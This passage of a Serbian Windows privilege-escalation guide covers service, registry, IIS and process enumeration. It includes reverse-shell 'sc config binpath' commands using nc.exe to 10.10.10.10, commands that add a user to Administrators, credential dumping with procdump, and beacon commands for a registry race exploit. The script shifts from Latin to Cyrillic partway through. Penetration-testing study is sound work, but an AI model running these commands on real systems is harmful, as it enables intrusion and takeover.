**Credential Guard** je uveden u **Windows 10**. Njegova svrha je zaštita akreditiva sačuvanih na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditivi domena** se autentifikuju pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavljivanje korisnika autentifikuju pomoću registrovanog bezbednosnog paketa, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Nabrajanje korisnika i grupa

Proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda možete da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i o tome kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Početne fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzimanje sadržaja međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete da **prepišete neku pokrenutu binarnu datoteku** ili imate dozvolu za pisanje u fasciklu binarne datoteke kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**, možete ih zloupotrebiti za eskalaciju privilegija](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener može kratko da bude aktivan, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug flag ne dokazuju mogućnost cross-user code execution. Rutinsko prikupljanje podataka obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola za binarne datoteke procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)** **

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Direktorijumi za Snort dinamičke preprocesore

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, proverite upravo tu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućeg code execution-a pri sledećem učitavanju modula od strane tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; sama mogućnost pisanja u direktorijum ne dokazuje eskalaciju. [Snort-ova dokumentacija za dinamičke preprocesore](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb servis sa direktorijumom dokumenata u koji može da se upisuje

Na Windows Apache instalaciji uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` vrednošću u aktivnom `httpd.conf` fajlu. Za uobičajeni XAMPP raspored, proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog direktorijuma dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom direktorijumu dok Apache radi kao `LocalSystem`, server-side code execution može da pređe granicu privilegija hosta. Potvrdite da je servis pokrenut, da se poslužuje tačna putanja i da server-side handler obrađuje tip datoteke; mogućnost pisanja u direktorijum sama po sebi dokazuje samo kreiranje datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u susednom direktorijumu `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene u virtual hostovima) i ACL korena. To što je WAMP direktorijum upisiv ne znači da se Apache pokreće kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet application pool-a

Za IIS, povežite upisiv fizički direktorijum sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji je pool konfigurisan i koji rukovalac obrađuje zahteve na serveru. Kod smešten u direktorijumu koji se poslužuje izvršava se kao pool samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Proverite efektivna prava trenutnog korisnika za kreiranje datoteka, stanje sajta, rukovalac i izmene koje važe za konkretnu putanju pre nego što upisiv direktorijum smatrate putem do izvršavanja koda.

Dinamička kompilacija ASP.NET-a otvara zaseban put koji treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano je to direktorijum `Temporary ASP.NET Files` u okviru odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da ga promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompilaciju kada application pool-ovi nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom worker procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: uporedite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompilacije, identitetom procesa i vremenom eventualne ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompilaciju niti menjati datoteke keša tokom enumeracije.

IIS pool konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se na resursima domena autentifikuje kao **računarsки налог hosta**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke privilegije lokalno i takođe koristi računarski nalog na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Pool `SpecificUser` koristi nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet application pool-a](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu se koristiti podrazumevane vrednosti pool-a, koje se razlikuju među verzijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena pool-a. Ako izvršavanje koda dospe do pool-a sa mrežnim identitetom računarskog naloga, procenite prava direktorijuma **tog konkretnog računara**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije nad kontekstom imenovanja domena; samo mašinski nalog ili uloga hosta ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Za čitljiv ASP.NET rukovalac koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Rukovalac koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti da metaznakovi ljuske promene komandu; [Microsoft dokumentuje specijalne znakove u `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi rukovaocu, a zatim utvrdite efektivni identitet application pool-a ili identitet nakon impersonation-a, kao i identitet pod kojim se pokreće podređeni proces. Čitljiva izvorna linija, localhost listener ili slabost u formatu tokena sami po sebi ne dokazuju privilegovano izvršavanje komandi. Pregледајте изворни код и конфигурацију pool-а без слања фалсификованих захтева нити покретања помоћног процеса током пасивне енумерације.

За PHP сервис на Windows-у, путања контролисана захтевом прослеђена функцији [`include` или `require`](https://www.php.net/manual/en/function.include.php) може да изврши PHP датотеку коју може да мења корисник са нижим привилегијама, под идентитетом worker-а. Потврдите да захтев може да досегне ту наредбу, да разрешена путања указује на датотеку коју корисник са нижим привилегијама може да мења, а worker да чита, да важећа PHP ограничења путања дозвољавају include и да се worker заиста покреће са вишим привилегијама. Loopback listener или уписива датотека сами по себи не доказују овај ланац; прегледајте изворни код, идентитет сервиса и ACL-ове датотека без позивања endpoint-а током пасивне енумерације.

### Pronalaženje lozinki u memoriji

Možete napraviti dump memorije procesa koji je u toku koristeći **procdump** iz sysinternals-a. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), potražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz drop direktorijuma u koji korisnik sa nižim privilegijama može da upisuje prelazi granicu poverenja u ulaznim podacima pod nalogom aplikacije za uvoz. Proverite **tačnu putanju na koju može da se upisuje**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je upotrebu XML external entities u metapodacima projekta; mrežni entitet na Windowsu mogao je da izazove autentifikaciju sa naloga koji uvozi ako [politika za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) to dozvoljava. To je trag koji može ukazivati na izlaganje akreditiva, a ne na neposredan pristup administratora: odgovor mora moći da se iskoristi zasebnim ovlašćenim ili ranjivim putem, a aktuelne verzije treba proceniti prema njihovom stvarnom stanju zakrpa. Nemojte otvarati posebno napravljen projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) nad objektom Service Control Manager (SCM) odvojeno je od prava nad postojećim servisom. Uspešan zahtev za pristup samo za čitanje preko [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo predstavlja trag za proveru, a ne dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa servisu koja su zatražena prilikom kreiranja; kasnije ponovno otvaranje servisa obavlja zasebnu proveru pristupa i može da ne uspe čak i kada je moguće koristiti originalni handle. Zasebno proverite efektivni lokalni ili udaljeni token, odobrena prava handle-a, nalog servisa, pravila pokretanja i putanju izvršne datoteke. Nemojte kreirati niti pokretati servis tokom pasivne enumeracije.

Za udaljeni put instalacije servisa, povežite ta SCM prava sa deljenim resursom na ciljnom sistemu na koji **isti mrežni nalog** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i mogućnost postavljanja datoteke; administratorski deljeni resurs nije neophodan uslov. Pravo upisa u deljeni resurs samo po sebi, kao ni trag da postoji pravo za kreiranje servisa u SCM-u, ne dokazuje da se novi servis može pokrenuti sa višim identitetom.

Postojeći servis može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada te pomoćne datoteke nema u njegovom `ImagePath`. Ako se ime pomoćne datoteke razrešava u direktorijum u koji korisnik sa nižim privilegijama može da upisuje, a servis radi pod višim identitetom, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i dostupan okidač životnog ciklusa. Direktorijum servisa u koji može da se upisuje ili samo nedostajuća datoteka ne dokazuju da servis učitava tu datoteku; tokom pasivne provere nemojte pokretati niti zaustavljati servis.

Za postojeći servis, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod servisa ili dokumentovani interfejs pre nego što pravo pokretanja smatrate nečim više od prava za upravljanje. Ako koristi argument koji bira pozivalac kao putanju za log ili izvoz, proverite identitet servisa, tačan tok od argumenta do upisa, ograničenja putanje i dozvole za **kreiranu datoteku**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; log u koji može da se upisuje ili samo pravo pokretanja nisu dovoljni. Tokom pasivne inventarizacije nemojte pokretati servis niti kreirati testnu datoteku.

Za NSClient++ monitoring agent, čitljivi `nsclient.ini` predstavlja **trag za proveru konfiguracije**: može sadržati web akreditive, dok `boot.ini` može da preusmeri konfiguraciju na drugu lokaciju. Proverite stvarni nalog servisa, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za privilegovano izvršavanje potrebno je i `CheckExternalScripts` (ili drugi omogućen put za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Listener dostupan samo preko loopback-a i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju da ta prava postoje. Pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja web API-ja tokom pasivne enumeracije. Pogledajte [raspored datoteka NSClient++](https://nsclient.org/docs/concepts/file-layout/), [uputstva za bezbednost web-a i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju external-script-a](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za servis čiji je `ImagePath` `nssm.exe`, proverite stvarni nalog pod kojim se servis pokreće i vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov konfigurisani radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove njenih nadređenih direktorijuma pre nego što dozvole omotača smatrate celom granicom servisa. Lokalni WCF ili SOAP endpoint koji izlaže podređena aplikacija predstavlja zaseban trag za proveru: potvrdite da li mu korisnik sa nižim privilegijama može pristupiti, da li tačna operacija prihvata njegov unos i da li podređena aplikacija servisa izvršava nesigurnu operaciju pod višim identitetom. Nalog servisa, URL endpoint-a ili putanja u koju može da se upisuje sami po sebi ne dokazuju eskalaciju; tokom pasivne enumeracije nemojte pozivati operacije servisa.

Za prilagođenu WCF operaciju, pratite string koji kontroliše pozivalac do bilo kog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows transportnim akreditivima](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali se ovlašćenje za pozivanje **te konkretne** operacije i efektivni identitet runspace-a moraju proveriti zasebno. Putanja od ulaza pozivaoca sa nižim privilegijama do `AddScript`-a pod višim identitetom servisa predstavlja granicu izvršavanja koda; port koji sluša, autentifikovani klijent ili nekorišćena metoda u nepovezanom sklopu sami po sebi nisu dokaz. Statički pregledajte instalirani servis, ugovor, ovlašćenja i podešavanja impersonation-a, bez pozivanja endpoint-a tokom enumeracije.

Service Triggers omogućavaju Windowsu da pokrene servis kada se ispune određeni uslovi (aktivnost named pipe/RPC endpoint-a, ETW događaji, dostupnost IP adrese, priključivanje uređaja, osvežavanje GPO-a itd.). Često možete pokrenuti privilegovane servise aktiviranjem njihovih okidača, čak i bez prava SERVICE_START. Tehnike za enumeraciju i aktiviranje nalaze se ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio servis za prikupljanje dijagnostike

Visual Studio instalacije sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostički servis podešen da radi kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i race uslov sa object-manager link-om da preusmeri resetovanje DACL-a servisa. Demonstrirana eskalacija je zahtevala i upotrebljiv put za popravku MSI-ja preko Visual Studio Setup WMI Provider-a, kao i ciljnu datoteku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu trijažu, proverite nalog i putanju binarne datoteke tog servisa, proverite da li postoji putanja do Setup WMI compiler-a i utvrdite stanje zakrpa instalirane komponente. Stavka servisa, verzija Visual Studio proizvoda ili datoteka compiler-a sami po sebi ne dokazuju da je host ranjiv. Provera ne zahteva pokretanje servisa niti pokretanje popravke.

Prikažite listu servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ kako biste proverili potreban nivo privilegija za svaki servis.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li „Authenticated Users“ mogu da menjaju neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete da preuzmete accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga ne može da se pokrene jer je onemogućena ili zato što nema povezanih omogućenih uređaja._

Možete da je omogućite pomoću –

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

Ako grupa „Authenticated users“ ima dozvolu **SERVICE_ALL_ACCESS** za neki servis, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovno konfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovno konfigurisanje dozvola, čime se stiče mogućnost menjanja konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovno konfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis pokreće kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može oteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete da dobijete sve binarne datoteke koje servis izvršava pomoću **wmic** (ne u system32) i da proverite svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, posebno dozvole **`(F)`**, **`(M)`** ili **`(W)`** nad izvršnom datotekom servisa ili direktorijumom koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju izvršne datoteke pomoću komande `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću komande `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću komande `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri pokretanju sistema, da li ima radnju pri otkazu koja je ponovo pokreće ili da li aplikacija koja je koristi može posredno da je pokrene.

### Dozvole za izmenu registra usluga

Trebalo bi da proverite da li možete da izmenite neki registar usluga.\
Možete **proveriti** svoje **dozvole** nad **registarskim ključem** usluge ovako:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za pisanje u ključu registra određene usluge. Sama ACL stavka ne dokazuje da je pristup efektivno omogućen: važni su deny stavke, trenutni token i nasleđene dozvole. Prava nad ključem registra odvojena su od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom usluge. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije usluge, način da se usluga pokrene i identitet usluge sa većim privilegijama. Pogledajte Microsoftove [dozvole nad ključevima registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [referencu o pravima pristupa uslugama](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race uslov sa registry symlink-om za proizvoljno upisivanje HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju per-user ključeve **ATConfig** koje **SYSTEM** proces kasnije kopira u HKLM ključ sesije. Race uslov sa registry **symbolic link-om** može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija mogućnost proizvoljnog upisivanja HKLM **vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` sadrži spisak instaliranih funkcija pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva korisnički kontrolisanu konfiguraciju.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijave ili prelaska na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobeditе u race uslovu** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** registry link-om ka zaštićenom HKLM cilju.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu HKLM putanju.

Kada dobijete mogućnost proizvoljnog upisivanja HKLM vrednosti, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** u sklopu race uslova.

Primeri alata (RegPwn BOF / samostalna verzija):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory za registar servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre unutar njega**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
